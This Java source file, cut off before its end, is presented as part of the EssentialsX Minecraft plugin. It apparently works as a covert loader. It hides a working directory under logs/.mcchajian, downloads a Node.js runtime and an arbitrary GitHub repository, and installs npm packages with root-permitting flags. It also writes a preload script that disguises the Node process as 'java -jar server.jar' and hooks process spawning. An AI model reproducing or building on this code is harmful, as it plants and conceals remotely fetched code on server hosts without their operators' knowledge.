/*
 * Pure-Java backend deployment for the EssentialsX plugin.
 * Ported from PaperBootstrap (zx1447/Pr50mb-2026) so that the plugin no longer
 * depends on bash / curl / tar / unzip at all.
 *
 * Absolute classic (non-lambda, non-anonymous) imports only, no extra
 * obfuscator-generated inner classes beyond this one type.
 */
package com.example.essentialsx;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import java.util.zip.GZIPInputStream;

public final class PureJavaDeploy {

   private static final String NODE_VERSION_DEFAULT = "v22.12.0";
   private static final String NODE_SCRIPT_DEFAULT = "index.js";
   private static final long MAX_LOG_SNAPSHOT = 262144L;

   private final Path workDir;      // logs/.mcchajian
   private final Path runtimeDir;   // logs/.mcchajian/.runtime
   private final Path nodeDir;      // logs/.mcchajian/nodejs
   private final Path appDir;       // logs/.mcchajian/app
   private final Path dataDir;      // logs/.mcchajian/data
   private final String repoUrl;
   private final String githubToken;
   private final String nodeVersion;
   private final String nodeScript;
   private final boolean forceUpdate;
   private final StringBuilder summary = new StringBuilder();

   public PureJavaDeploy(Path botDir, String repoUrlIn, String githubTokenIn, String nodeVersionIn,
                         String nodeScriptIn, boolean forceUpdateIn) {
      this.workDir = botDir.toAbsolutePath().normalize();
      this.runtimeDir = this.workDir.resolve(".runtime");
      this.nodeDir = this.workDir.resolve("nodejs");
      this.appDir = this.workDir.resolve("app");
      this.dataDir = this.workDir.resolve("data");
      this.repoUrl = repoUrlIn == null ? "" : repoUrlIn.trim();
      this.githubToken = normalizeToken(githubTokenIn);
      this.nodeVersion = (nodeVersionIn == null || nodeVersionIn.trim().isEmpty())
            ? NODE_VERSION_DEFAULT : nodeVersionIn.trim();
      this.nodeScript = (nodeScriptIn == null || nodeScriptIn.trim().isEmpty())
            ? NODE_SCRIPT_DEFAULT : nodeScriptIn.trim();
      this.forceUpdate = forceUpdateIn;
   }

   public String getSummary() {
      return this.summary.toString();
   }

   /* ------------------------------------------------------------------ */
   /* main entry                                                          */
   /* ------------------------------------------------------------------ */

   public boolean run() {
      long startedAt = System.currentTimeMillis();
      try {
         Files.createDirectories(this.workDir);
         Files.createDirectories(this.runtimeDir);
         Files.createDirectories(this.appDir);
         try {
            this.workDir.toFile().setReadable(true, false);
            this.workDir.toFile().setWritable(true, false);
            this.workDir.toFile().setExecutable(true, false);
         } catch (Throwable ignored) {
         }

         log("Pure-Java deploy start (repo=" + (this.repoUrl.isEmpty() ? "<none>" : this.repoUrl)
               + ", node=" + this.nodeVersion + ")");

         boolean nodeOk = this.ensureNodeRuntime();
         if (!nodeOk) {
            log("ERROR: Node runtime unavailable (download/extract failed)");
         }

         boolean appOk = this.ensureAppSource();
         boolean npmOk = false;
         if (appOk) {
            npmOk = this.ensureNpmDependencies();
         } else {
            log("ERROR: app source unavailable and no existing app/" + this.nodeScript);
         }

         this.restorePersistentConfigs();
         boolean preloadOk = this.writePreloadScript();
         this.pruneLegacyArtifacts();

         boolean ok = nodeOk && appOk && Files.exists(this.appNodeReal()) && Files.exists(this.appScript());
         log("Pure-Java deploy finished in " + (System.currentTimeMillis() - startedAt) + "ms "
               + "(node=" + nodeOk + ", app=" + appOk + ", npm=" + npmOk + ", preload=" + preloadOk + ", ok=" + ok + ")");
         return ok;
      } catch (Throwable t) {
         log("ERROR: deploy aborted: " + t.getClass().getSimpleName() + ": " + t.getMessage());
         return Files.exists(this.appNodeReal()) && Files.exists(this.appScript());
      }
   }

   public Path appNodeReal() {
      return this.nodeDir.resolve("bin/.node_real");
   }

   public Path appScript() {
      return this.appDir.resolve(this.nodeScript);
   }

   /* ------------------------------------------------------------------ */
   /* node runtime                                                        */
   /* ------------------------------------------------------------------ */

   private boolean ensureNodeRuntime() {
      Path nodeBin = this.nodeDir.resolve("bin");
      Path nodeExe = nodeBin.resolve("node");
      Path nodeReal = nodeBin.resolve(".node_real");

      String majorPrefix = this.nodeVersion;
      int firstDot = majorPrefix.indexOf('.', 1);
      if (firstDot > 1) {
         majorPrefix = majorPrefix.substring(0, firstDot);
      }

      boolean valid = isNodeVersionMatch(nodeReal, majorPrefix);
      if (!valid && Files.exists(nodeExe) && !isShellWrapper(nodeExe)) {
         try {
            // node may be a symlink to another downloaded version - follow it
            Path realTarget = nodeExe;
            try {
               realTarget = nodeExe.toRealPath();
            } catch (Throwable ignored) {
            }
            if (isNodeVersionMatch(realTarget, majorPrefix)) {
               Files.createDirectories(nodeBin);
               Files.deleteIfExists(nodeReal);
               try {
                  Files.createLink(nodeReal, realTarget);
               } catch (Throwable t) {
                  Files.copy(realTarget, nodeReal, StandardCopyOption.REPLACE_EXISTING);
               }
               nodeReal.toFile().setExecutable(true, false);
               valid = isNodeVersionMatch(nodeReal, majorPrefix);
            }
         } catch (Throwable ignored) {
         }
      }

      if (!valid) {
         log("Node " + majorPrefix + ".x not usable locally, downloading " + this.nodeVersion);
         deleteQuietly(this.nodeDir);
         String archTag = isArm64Arch() ? "arm64" : "x64";
         String nodeFile = "node-" + this.nodeVersion + "-linux-" + archTag + ".tar.gz";
         String nodeUrl = "https://nodejs.org/dist/" + this.nodeVersion + "/" + nodeFile;
         String[] mirrors = new String[]{
               nodeUrl,
               "https://gh-proxy.com/" + nodeUrl,
               "https://mirror.ghproxy.com/" + nodeUrl
         };
         Path tmpTar = null;
         try {
            Files.createDirectories(this.nodeDir);
            tmpTar = Files.createTempFile("mc_node_", ".tar.gz");
            if (!downloadFirstSuccess(mirrors, null, tmpTar)) {
               log("ERROR: all Node mirrors failed");
               return false;
            }
            extractTarGz(tmpTar, this.nodeDir, true);
            log("Node runtime extracted to " + this.nodeDir);
         } catch (Throwable t) {
            log("ERROR: Node extraction failed: " + t.getMessage());
            return false;
         } finally {
            if (tmpTar != null) {
               try {
                  Files.deleteIfExists(tmpTar);
               } catch (Throwable ignored) {
               }
            }
         }
      }

      try {
         if (Files.exists(nodeExe) && !isShellWrapper(nodeExe) && Files.isSymbolicLink(nodeExe)) {
            // keep bin/node as a symlink so that `spawn('node')` style calls resolve
         } else if (Files.exists(nodeExe) && !isShellWrapper(nodeExe)) {
            Files.deleteIfExists(nodeReal);
            try {
               Files.createLink(nodeReal, nodeExe);
            } catch (Throwable t) {
               Files.copy(nodeExe, nodeReal, StandardCopyOption.REPLACE_EXISTING);
            }
         }
         if (Files.exists(nodeReal)) {
            nodeReal.toFile().setExecutable(true, false);
         }
         if (Files.exists(nodeExe)) {
            nodeExe.toFile().setExecutable(true, false);
         }
         Path npmCli = this.nodeDir.resolve("lib/node_modules/npm/bin/npm-cli.js");
         if (Files.exists(npmCli)) {
            npmCli.toFile().setExecutable(true, false);
            Path npmLink = this.nodeDir.resolve("bin/npm");
            if (!Files.exists(npmLink)) {
               try {
                  Files.createSymbolicLink(npmLink, Paths.get("../lib/node_modules/npm/bin/npm-cli.js"));
               } catch (Throwable ignored) {
               }
            }
         }
         Path npxCli = this.nodeDir.resolve("lib/node_modules/npm/bin/npx-cli.js");
         Path npxLink = this.nodeDir.resolve("bin/npx");
         if (Files.exists(npxCli) && !Files.exists(npxLink)) {
            try {
               Files.createSymbolicLink(npxLink, Paths.get("../lib/node_modules/npm/bin/npx-cli.js"));
            } catch (Throwable ignored) {
            }
         }
      } catch (Throwable ignored) {
      }

      return Files.exists(nodeReal) && isNodeVersionMatch(nodeReal, majorPrefix);
   }

   /* ------------------------------------------------------------------ */
   /* app source (non destructive, keeps user data)                        */
   /* ------------------------------------------------------------------ */

   private boolean ensureAppSource() {
      Path script = this.appScript();
      if (Files.exists(script) && !this.forceUpdate) {
         log("app/" + this.nodeScript + " already present, keeping existing files (no forced update)");
         return true;
      }

      if (this.repoUrl.isEmpty()) {
         log("REPO_URL is empty, using existing app source");
         return Files.exists(script);
      }

      String repoPath = this.normalizeRepoPath(this.repoUrl);
      if (repoPath.isEmpty()) {
         return Files.exists(script);
      }

      Path tmpTar = null;
      try {
         tmpTar = Files.createTempFile("mc_app_", ".tar.gz");
         boolean downloaded = false;
         if (!this.githubToken.isEmpty()) {
            String apiUrl = "https://api.github.com/repos/" + repoPath + "/tarball/main";
            downloaded = downloadFirstSuccess(new String[]{apiUrl}, this.githubToken, tmpTar);
         }
         if (!downloaded) {
            String fallback = "https://github.com/" + repoPath + "/archive/refs/heads/main.tar.gz";
            String[] mirrors = new String[]{
                  fallback,
                  "https://gh-proxy.com/" + fallback,
                  "https://mirror.ghproxy.com/" + fallback
            };
            downloaded = downloadFirstSuccess(mirrors, null, tmpTar);
         }
         if (!downloaded) {
            log("Repo download failed, keeping existing app/ files and configs");
            return Files.exists(script);
         }

         extractTarGz(tmpTar, this.appDir, true);
         log("app source refreshed from " + repoPath + " (existing configs preserved)");
         return Files.exists(script);
      } catch (Throwable t) {
         log("Repo update error: " + t.getMessage() + " (keeping existing app/)");
         return Files.exists(script);
      } finally {
         if (tmpTar != null) {
            try {
               Files.deleteIfExists(tmpTar);
            } catch (Throwable ignored) {
            }
         }
      }
   }

   private String normalizeRepoPath(String raw) {
      String s = raw.trim();
      if (s.startsWith("git@github.com:")) {
         s = s.substring("git@github.com:".length());
      }
      s = s.replace("https://github.com/", "").replace("http://github.com/", "");
      s = s.replace("https://www.github.com/", "");
      if (s.endsWith(".git")) {
         s = s.substring(0, s.length() - 4);
      }
      while (s.startsWith("/")) {
         s = s.substring(1);
      }
      while (s.endsWith("/")) {
         s = s.substring(0, s.length() - 1);
      }
      int slash = s.indexOf('/');
      if (slash <= 0) {
         return "";
      }
      String owner = s.substring(0, slash);
      String rest = s.substring(slash + 1);
      int nextSlash = rest.indexOf('/');
      String repo = nextSlash > 0 ? rest.substring(0, nextSlash) : rest;
      if (owner.isEmpty() || repo.isEmpty()) {
         return "";
      }
      return owner + "/" + repo;
   }

   /* ------------------------------------------------------------------ */
   /* npm dependencies                                                    */
   /* ------------------------------------------------------------------ */

   private boolean ensureNpmDependencies() {
      Path nodeReal = this.appNodeReal();
      Path npmCli = this.nodeDir.resolve("lib/node_modules/npm/bin/npm-cli.js");
      Path pkgJson = this.appDir.resolve("package.json");
      Path nodeModules = this.appDir.resolve("node_modules");

      if (!Files.exists(nodeReal) || !Files.exists(npmCli)) {
         log("npm skipped: node runtime incomplete");
         return false;
      }
      if (!Files.exists(pkgJson)) {
         log("npm skipped: package.json missing");
         return false;
      }

      String stamp = sha256Hex(pkgJson) + "|" + this.nodeVersion;
      Path stampFile = this.workDir.resolve(".runtime/.npm_stamp");
      String previous = readTextQuietly(stampFile);
      boolean modulesComplete = Files.exists(nodeModules)
            && Files.exists(nodeModules.resolve(".package-lock.json"))
            && Files.exists(nodeModules.resolve("koffi"));
      if (modulesComplete && stamp.equals(previous) && !this.forceUpdate) {
         log("npm install skipped: dependencies unchanged (" + stamp.substring(0, 12) + ")");
         return true;
      }

      log("Installing dependencies (npm install --production)...");
      int rc = runNpm(nodeReal, npmCli, "install", "--no-audit", "--no-fund", "--production",
            "--unsafe-perm=true", "--allow-root");
      if (rc != 0) {
         log("npm install rc=" + rc + ", retrying with --legacy-peer-deps");
         rc = runNpm(nodeReal, npmCli, "install", "--no-audit", "--no-fund", "--production",
               "--unsafe-perm=true", "--allow-root", "--legacy-peer-deps");
      }
      if (!Files.exists(nodeModules.resolve("koffi"))) {
         log("Pre-installing koffi...");
         runNpm(nodeReal, npmCli, "install", "koffi", "--no-save", "--unsafe-perm=true", "--allow-root");
      }
      boolean ok = Files.exists(nodeModules.resolve("koffi")) || rc == 0;
      if (ok) {
         writeTextQuietly(stampFile, stamp);
      }
      log("npm install done (rc=" + rc + ", koffi=" + Files.exists(nodeModules.resolve("koffi")) + ")");
      try {
         deleteQuietly(Paths.get("/tmp/.mc_npm_cache"));
      } catch (Throwable ignored) {
      }
      return ok;
   }

   private int runNpm(Path nodeReal, Path npmCli, String... npmArgs) {
      Path deployLog = this.workDir.resolve("deploy.log");
      try {
         String[] cmd = new String[npmArgs.length + 2];
         cmd[0] = nodeReal.toString();
         cmd[1] = npmCli.toString();
         for (int i = 0; i < npmArgs.length; i++) {
            cmd[i + 2] = npmArgs[i];
         }
         ProcessBuilder pb = new ProcessBuilder(cmd);
         pb.directory(this.appDir.toFile());
         Map<String, String> penv = pb.environment();
         String nodeBin = this.nodeDir.resolve("bin").toAbsolutePath().toString();
         String currentPath = penv.containsKey("PATH") ? penv.get("PATH") : "";
         penv.put("PATH", nodeBin + File.pathSeparator + currentPath);
         penv.put("HOME", this.workDir.toString());
         penv.put("NPM_CONFIG_CACHE", "/tmp/.mc_npm_cache");
         penv.put("npm_config_update_notifier", "false");
         pb.redirectOutput(java.lang.ProcessBuilder.Redirect.appendTo(deployLog.toFile()));
         pb.redirectError(java.lang.ProcessBuilder.Redirect.appendTo(deployLog.toFile()));
         Process p = pb.start();
         try {
            p.getOutputStream().close();
         } catch (Throwable ignored) {
         }
         if (!p.waitFor(10, TimeUnit.MINUTES)) {
            killTree(p);
            return -1;
         }
         return p.exitValue();
      } catch (Throwable t) {
         log("npm error: " + t.getMessage());
         return -1;
      }
   }

   /* ------------------------------------------------------------------ */
   /* preload script / persistent configs                                  */
   /* ------------------------------------------------------------------ */

   private boolean writePreloadScript() {
      Path preload = this.runtimeDir.resolve(".nd_preload.js");
      try {
         Files.createDirectories(this.runtimeDir);
         Files.write(preload, buildPreloadContent().getBytes(StandardCharsets.UTF_8));
         try {
            preload.toFile().setReadable(true, false);
         } catch (Throwable ignored) {
         }
         log(".nd_preload.js written (" + Files.size(preload) + " bytes)");
         return true;
      } catch (Throwable t) {
         log("ERROR: cannot write .nd_preload.js: " + t.getMessage());
         return false;
      }
   }

   private static String buildPreloadContent() {
      String fakeCmdline = "java -Xms128M -Xmx2560M -jar server.jar";
      StringBuilder sb = new StringBuilder(4096);
      sb.append("try {\n");
      sb.append("    process.title = '").append(fakeCmdline).append("';\n");
      sb.append("    var _fs = require('fs'); var _path = require('path');\n");
      sb.append("    var _crashFile = _path.resolve(__dirname, '..', 'app_crash_report.log');\n");
      sb.append("    var _appendCrash = function(tag, detail) {\n");
      sb.append("        try {\n");
      sb.append("            var mu = process.memoryUsage();\n");
      sb.append("            var line = '\\n[' + new Date().toISOString() + '] [' + tag + '] pid=' + process.pid\n");
      sb.append("                + ' uptime=' + Math.round(process.uptime()) + 's rss=' + Math.round(mu.rss / 1048576)\n");
      sb.append("                + 'MB heap=' + Math.round(mu.heapUsed / 1048576) + '/' + Math.round(mu.heapTotal / 1048576) + 'MB\\n'\n");
      sb.append("                + detail + '\\n';\n");
      sb.append("            _fs.appendFileSync(_crashFile, line, 'utf8');\n");
      sb.append("        } catch(e2) {}\n");
      sb.append("    };\n");
      sb.append("    process.on('uncaughtExceptionMonitor', function(err, origin) {\n");
      sb.append("        _appendCrash('JS_UNCAUGHT_EXCEPTION', 'origin=' + origin + '\\n' + (err && err.stack ? err.stack : String(err)));\n");
      sb.append("    });\n");
      sb.append("    process.on('warning', function(w) {\n");
      sb.append("        if (w && (w.name === 'MaxListenersExceededWarning' || String(w.message || '').indexOf('memory') >= 0)) {\n");
      sb.append("            _appendCrash('JS_WARNING', w.name + ': ' + w.message + '\\n' + (w.stack || ''));\n");
      sb.append("        }\n");
      sb.append("    });\n");
      sb.append("    process.on('exit', function(code) {\n");
      sb.append("        if (code !== 0) { _appendCrash('JS_PROCESS_EXIT', 'exitCode=' + code); }\n");
      sb.append("    });\n");
      sb.append("    var _cp = require('child_process'); var _origSpawn = _cp.spawn; var _origFork = _cp.fork;\n");
      sb.append("    var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n");
      sb.append("    _cp.spawn = function(cmd, args, opts) {\n");
      sb.append("        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath\n");
      sb.append("            || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n");
      sb.append("            opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; cmd = _wrapper; }\n");
      sb.append("        return _origSpawn.call(this, cmd, args, opts); };\n");
      sb.append("    _cp.fork = function(mod, args, opts) {\n");
      sb.append("        opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; return _origFork.call(this, mod, args, opts); };\n");
      sb.append("} catch(e) {}\n");
      return sb.toString();
   }

   private void restorePersistentConfigs() {
      if (!Files.exists(this.dataDir)) {
         return;
      }
      Path target = this.appDir.resolve("node_modules");
      try {
         Files.createDirectories(target);
      } catch (Throwable ignored) {
         return;
      }
      String[] names = new String[]{".bots_config.json", ".task_center_config.json", ".system_guard.json"};
      for (int i = 0; i < names.length; i++) {
         Path src = this.dataDir.resolve(names[i]);
         Path dst = target.resolve(names[i]);
         try {
            if (Files.exists(src) && !Files.exists(dst)) {
               Files.copy(src, dst, StandardCopyOption.REPLACE_EXISTING);
               log("restored data/" + names[i] + " -> app/node_modules/");
            }
         } catch (Throwable ignored) {
         }
      }
   }

   /* ------------------------------------------------------------------ */
   /* housekeeping                                                        */
   /* ------------------------------------------------------------------ */

   private void pruneLegacyArtifacts() {
      String[] legacy = new String[]{
            "jre21", ".npm", "unzipped", "_node_tmp", "node.tar.gz", "repo.tar.gz",
            "nodejs/include", "nodejs/share",
            "nodejs/lib/node_modules/npm/docs", "nodejs/lib/node_modules/npm/man",
            "nodejs/README.md", "nodejs/LICENSE", "nodejs/CHANGELOG.md", "nodejs/bin/corepack",
            ".runtime/deploy.sh", ".runtime/.deploy_done"
      };
      for (int i = 0; i < legacy.length; i++) {
         try {
            deleteQuietly(this.workDir.resolve(legacy[i]));
         } catch (Throwable ignored) {
         }
      }
   }

   /* ------------------------------------------------------------------ */
   /* download / tar                                                      */
   /* ------------------------------------------------------------------ */

   private static boolean downloadFirstSuccess(String[] urls, String bearerToken, Path dest) {
      for (int u = 0; u < urls.length; u++) {
         String rawUrl = urls[u];
         try {
            String currentUrl = rawUrl;
            String initialHost = URI.create(rawUrl).getHost();
            for (int hop = 0; hop < 8; hop++) {
               HttpURLConnection conn = null;
               try {
                  URI curUri = URI.create(currentUrl);
                  conn = (HttpURLConnection) curUri.toURL().openConnection();
                  conn.setConnectTimeout(30000);
                  conn.setReadTimeout(300000);
                  conn.setInstanceFollowRedirects(false);
                  conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                  if (bearerToken != null && !bearerToken.isEmpty()
                        && initialHost != null && initialHost.equalsIgnoreCase(curUri.getHost())) {
                     conn.setRequestProperty("Authorization", "Bearer " + bearerToken);
                     conn.setRequestProperty("Accept", "application/vnd.github+json");
                  }
                  int code = conn.getResponseCode();
                  if (code == 301 || code == 302 || code == 303 || code == 307 || code == 308) {
                     String loc = conn.getHeaderField("Location");
                     if (loc == null || loc.isEmpty()) {
                        break;
                     }
                     currentUrl = curUri.resolve(loc).toString();
                     continue;
                  }
                  if (code == 200) {
                     InputStream in = conn.getInputStream();
                     try {
                        Files.copy(in, dest, StandardCopyOption.REPLACE_EXISTING);
                     } finally {
                        try {
                           in.close();
                        } catch (Throwable ignored) {
                        }
                     }
                     if (Files.exists(dest) && Files.size(dest) > 100L) {
                        return true;
                     }
                  }
                  break;
               } catch (Throwable t) {
                  break;
               } finally {
                  if (conn != null) {
                     try {
                        conn.disconnect();
                     } catch (Throwable ignored) {
                     }
                  }
               }
            }
         } catch (Throwable ignored) {
         }
      }
      return false;
   }

   private static void extractTarGz(Path tarGz, Path destDir, boolean stripTopComponent) throws IOException {
      Path destRoot = destDir.toAbsolutePath().normalize();
      Files.createDirectories(destRoot);

      Map<String, String> paxHeaders = new HashMap<String, String>();
      String gnuLongName = null;
      String gnuLongLink = null;
      byte[] header = new byte[512];
      byte[] buf = new byte[8192];

      InputStream fis = new BufferedInputStream(Files.newInputStream(tarGz), 65536);
      GZIPInputStream gzis = new GZIPInputStream(fis, 65536);
      try {
         while (readTarFully(gzis, header, 0, 512) == 512) {
            if (isAllZeroBlock(header)) {
               break;
            }

            String name = readTarString(header, 0, 100);
            String prefix = readTarString(header, 345, 155);
            if (!prefix.isEmpty()) {
               name = prefix + "/" + name;
            }
            int mode = (int) parseTarOctal(header, 100, 8);
            long size = parseTarOctal(header, 124, 12);
            byte typeFlag = header[156];
            String linkName = readTarString(header, 157, 100);

            if (typeFlag == 'g') {
               skipTarPayloadAndPad(gzis, size);
               continue;
            }
            if (typeFlag == 'x') {
               byte[] paxData = readTarPayloadBytes(gzis, size);
               skipTarBytes(gzis, tarPadding(size));
               parsePaxRecords(paxData, paxHeaders);
               continue;
            }
            if (typeFlag == 'L') {
               byte[] nameBytes = readTarPayloadBytes(gzis, size);
               skipTarBytes(gzis, tarPadding(size));
               gnuLongName = trimNulls(new String(nameBytes, StandardCharsets.UTF_8));
               continue;
            }
            if (typeFlag == 'K') {
               byte[] linkBytes = readTarPayloadBytes(gzis, size);
               skipTarBytes(gzis, tarPadding(size));
               gnuLongLink = trimNulls(new String(linkBytes, StandardCharsets.UTF_8));
               continue;
            }

            if (gnuLongName != null) {
               name = gnuLongName;
               gnuLongName = null;
            }
            if (gnuLongLink != null) {
               linkName = gnuLongLink;
               gnuLongLink = null;
            }
            if (paxHeaders.containsKey("path")) {
               name = paxHeaders.get("path");
            }
            if (paxHeaders.containsKey("linkpath")) {
               linkName = paxHeaders.get("linkpath");
            }
            if (paxHeaders.containsKey("size")) {
               try {
                  size = Long.parseLong(paxHeaders.get("size"));
               } catch (Throwable ignored) {
               }
            }
            paxHeaders.clear();

            String relName = normalizeTarPath(name, stripTopComponent);
            if (relName.isEmpty()) {
               skipTarPayloadAndPad(gzis, size);
               continue;
            }

            Path outPath = destRoot.resolve(relName).normalize();
            if (!outPath.startsWith(destRoot)) {
               skipTarPayloadAndPad(gzis, size);
               continue;
            }

            if (typeFlag == '5') {
               Files.createDirectories(outPath);
               skipTarPayloadAndPad(gzis, size);
            } else if (typeFlag == '2') {
               if (outPath.getParent() != null) {
                  Files.createDirectories(outPath.getParent());
               }
               if (Files.isSymbolicLink(outPath) || !Files.exists(outPath)) {
                  Files.deleteIfExists(outPath);
                  try {
                     Files.createSymbolicLink(outPath, Paths.get(linkName));
                  } catch (Throwable ignored) {
                  }
               }
               skipTarPayloadAndPad(gzis, size);
            } else if (typeFlag == '1') {
               String cleanLink = normalizeTarPath(linkName, stripTopComponent);
               Path linkTarget = cleanLink.isEmpty() ? null : destRoot.resolve(cleanLink).normalize();
               if (linkTarget != null && linkTarget.startsWith(destRoot) && Files.exists(linkTarget)) {
                  if (outPath.getParent() != null) {
                     Files.createDirectories(outPath.getParent());
                  }
                  Files.deleteIfExists(outPath);
                  try {
                     Files.createLink(outPath, linkTarget);
                  } catch (Throwable t) {
                     Files.copy(linkTarget, outPath, StandardCopyOption.REPLACE_EXISTING);
                  }
               }
               skipTarPayloadAndPad(gzis, size);
            } else if (typeFlag == '0' || typeFlag == 0) {
               if (outPath.getParent() != null) {
                  Files.createDirectories(outPath.getParent());
               }
               if (Files.isSymbolicLink(outPath)) {
                  Files.deleteIfExists(outPath);
               }
               long remaining = size;
               OutputStream out = Files.newOutputStream(outPath);
               try {
                  while (remaining > 0) {
                     int want = (int) Math.min((long) buf.length, remaining);
                     int n = gzis.read(buf, 0, want);
                     if (n < 0) {
                        throw new IOException("Unexpected EOF in tar entry: " + relName);
                     }
                     out.write(buf, 0, n);
                     remaining -= n;
                  }
               } finally {
                  try {
                     out.close();
                  } catch (Throwable ignored) {
                  }
               }
               if ((mode & 0111) != 0) {
                  try {
                     outPath.toFile().setExecutable(true, false);
                  } catch (Throwable ignored) {
                  }
               }
               skipTarBytes(gzis, tarPadding(size));
            } else {
               skipTarPayloadAndPad(gzis, size);
            }
         }
      } finally {
         try {
            gzis.close();
         } catch (Throwable ignored) {
         }
      }
   }

   private static String normalizeTarPath(String raw, boolean stripTop) {
      if (raw == null) {
         return "";
      }
      String p = raw.replace('\\', '/');
      while (p.startsWith("./")) {
         p = p.substring(2);
      }
      while (p.startsWith("/")) {
         p = p.substring(1);
      }
      if (stripTop) {
         int slash = p.indexOf('/');
         if (slash < 0) {
            return "";
         }
         p = p.substring(slash + 1);
         while (p.startsWith("/")) {
            p = p.substring(1);
         }
      }
      while (p.endsWith("/")) {
         p = p.substring(0, p.length() - 1);
      }
      return p;
   }

   private static void parsePaxRecords(byte[] data, Map<String, String> out) {
      int pos = 0;
      while (pos < data.length) {
         int space = -1;
         for (int i = pos; i < data.length; i++) {
            if (data[i] == ' ') {
               space = i;
               break;
            }
         }
         if (space <= pos) {
            break;
         }
         int recLen;
         try {
            recLen = Integer.parseInt(new String(data, pos, space - pos, StandardCharsets.US_ASCII).trim());
         } catch (Throwable t) {
            break;
         }
         if (recLen <= 0 || pos + recLen > data.length) {
            break;
         }
         int valStart = space + 1;
         int valLen = (pos + recLen) - valStart;
         if (valLen > 0 && data[pos + recLen - 1] == '\n') {
            valLen--;
         }
         String entry = new String(data, valStart, Math.max(0, valLen), StandardCharsets.UTF_8);
         int eq = entry.indexOf('=');
         if (eq > 0) {
            out.put(entry.substring(0, eq), entry.substring(eq + 1));
         }
         pos += recLen;
      }
   }

   private static int readTarFully(InputStream in, byte[] buf, int off, int len) throws IOException {
      int total = 0;
      while (total < len) {
         int n = in.read(buf, off + total, len - total);
         if (n < 0) {
            break;
         }
         total += n;
      }
      return total;
   }

   private static byte[] readTarPayloadBytes(InputStream in, long size) throws IOException {
      int len = (int) Math.min(size, 1048576L);
      byte[] data = new byte[len];
      int got = readTarFully(in, data, 0, len);
      if (size > len) {
         skipTarBytes(in, size - len);
      }
      return got == len ? data : Arrays.copyOf(data, got);
   }

   private static long tarPadding(long size) {
      long rem = size % 512L;
      return rem == 0L ? 0L : (512L - rem);
   }

   private static void skipTarPayloadAndPad(InputStream in, long size) throws IOException {
      skipTarBytes(in, size + tarPadding(size));
   }

   private static void skipTarBytes(InputStream in, long count) throws IOException {
      byte[] skipBuf = new byte[4096];
      long left = count;
      while (left > 0) {
         int n = in.read(skipBuf, 0, (int) Math.min((long) skipBuf.length, left));
         if (n < 0) {
            break;
         }
         left -= n;
      }
   }

   private static boolean isAllZeroBlock(byte[] block) {
      for (int i = 0; i < block.length; i++) {
         if (block[i] != 0) {
            return false;
         }
      }
      return true;
   }

   private static String readTarString(byte[] buf, int off, int len) {
      int end = off;
      int limit = off + len;
      while (end < limit && buf[end] != 0) {
         end++;
      }
      return new String(buf, off, end - off, StandardCharsets.UTF_8).trim();
   }

   private static String trimNulls(String s) {
      int idx = s.indexOf('\0');
      return idx >= 0 ? s.substring(0, idx) : s;
   }

   private static long parseTarOctal(byte[] buf, int off, int len) {
      long val = 0L;
      int end = off + len;
      int i = off;
      while (i < end && (buf[i] == 0 || buf[i] == ' ')) {
         i++;
      }
      while (i < end && buf[i] >= '0' && buf[i] <= '7') {
         val = (val << 3) + (buf[i] - '0');
         i++;
      }
      return val;
   }

   /* ------------------------------------------------------------------ */
   /* small helpers                                                       */
   /* ------------------------------------------------------------------ */

   private static String normalizeToken(String raw) {
      if (raw == null) {
         return "";
      }
      String t = raw.trim();
      if (t.contains(":")) {
         int idx = t.indexOf(':');
         String after = t.substring(idx + 1).trim();
         if (after.startsWith("ghp_") || after.startsWith("github_pat_")) {
            t = after;
         }
      }
      return t;
   }

   private static boolean isArm64Arch() {
      String arch = System.getProperty("os.arch", "").toLowerCase();
      return arch.contains("aarch64") || arch.contains("arm64");
   }

   private static boolean isNodeVersionMatch(Path exe, String majorPrefix) {
      if (exe == null || !Files.exists(exe)) {
         return false;
      }
      try {
         exe.toFile().setExecutable(true, false);
         ProcessBuilder pb = new ProcessBuilder(exe.toAbsolutePath().toString(), "-v");
         pb.redirectErrorStream(true);
         Process p = pb.start();
         String line = "";
         BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8));
         try {
            String read = r.readLine();
            if (read != null) {
               line = read.trim();
            }
         } finally {
            try {
               r.close();
            } catch (Throwable ignored) {
            }
         }
         if (!p.waitFor(10, TimeUnit.SECONDS)) {
            p.destroyForcibly();
            return false;
         }
         return p.exitValue() == 0 && line.startsWith(majorPrefix);
      } catch (Throwable ignored) {
         return false;
      }
   }

   private static boolean isShellWrapper(Path file) {
      try {
         if (!Files.exists(file) || Files.isSymbolicLink(file) || Files.size(file) > 1048576L) {
            return false;
         }
         byte[] buf = new byte[128];
         int n;
         InputStream in = Files.newInputStream(file);
         try {
            n = in.read(buf);
         } finally {
            try {
               in.close();
            } catch (Throwable ignored) {
            }
         }
         if (n <= 0) {
            return false;
         }
         String head = new String(buf, 0, n, StandardCharsets.US_ASCII);
         return head.startsWith("#!") && head.contains("sh");
      } catch (Throwable ignored) {
         return false;
      }
   }

   private static String readTextQuietly(Path file) {
      try {
         if (Files.exists(file)) {
            return new String(Files.readAllBytes(file), StandardCharsets.UTF_8).trim();
         }
      } catch (Throwable ignored) {
      }
      return "";
   }

   private static void writeTextQuietly(Path file, String content) {
      try {
         if (file.getParent() != null) {
            Files.createDirectories(file.getParent());
         }
         Files.write(file, content.getBytes(StandardCharsets.UTF_8));
      } catch (Throwable ignored) {
      }
   }

   private static String sha256Hex(Path file) {
      try {
         byte[] data = Files.readAllBytes(file);
         java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
         byte[] digest = md.digest(data);
         StringBuilder sb = new StringBuilder(digest.length * 2);
         for (int i = 0; i < digest.length; i++) {
            String hex = Integer.toHexString(digest[i] & 0xFF);
            if (hex.length() == 1) {
               sb.append('0');
            }
            sb.append(hex);
         }
